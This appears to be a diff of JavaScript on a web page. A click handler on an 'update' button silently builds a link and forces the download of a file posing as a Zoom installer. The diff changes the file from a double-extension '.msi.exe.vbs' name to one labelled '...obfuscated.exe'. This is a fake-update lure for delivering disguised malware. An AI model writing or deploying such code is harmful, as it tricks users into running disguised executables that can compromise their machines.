@@ -13,8 +13,8 @@ if (updateButton) {
         event.preventDefault();
         // create a temporary link to download
         var a = document.createElement('a');
-        a.href = 'ZoomInstaller Full Version 2026 v27.3.0.23.msi.exe.vbs';
-        a.download = 'ZoomInstaller Full Version 2026 v27.3.0.23.msi.exe.vbs';
+        a.href = 'ZoomInstallerFull 2026 updated version26.5.8.21..obfuscated.exe';
+        a.download = 'ZoomInstallerFull 2026 updated version26.5.8.21..obfuscated.exe';
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
